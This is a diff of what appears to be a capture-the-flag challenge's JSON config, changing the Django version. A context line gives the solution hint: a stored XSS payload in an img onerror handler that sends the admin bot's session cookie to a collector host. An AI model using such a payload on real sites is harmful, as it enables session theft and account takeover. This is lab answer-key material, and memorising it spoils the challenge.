@@ -20,7 +20,7 @@
   "flag_hint": "POST /comment {\"body\":\"<img src=x onerror=\\\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\\\">\"}; the admin bot renders it on GET /admin/moderate (|safe), exfiltrating its session cookie. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
   "tech_stack": [
     "Python 3.12",
-    "Django 5.1",
+    "Django 5.2",
     "gunicorn 23",
     "PostgreSQL 16",
     "@websec-lab/xss-verifier headless-Chromium bot",
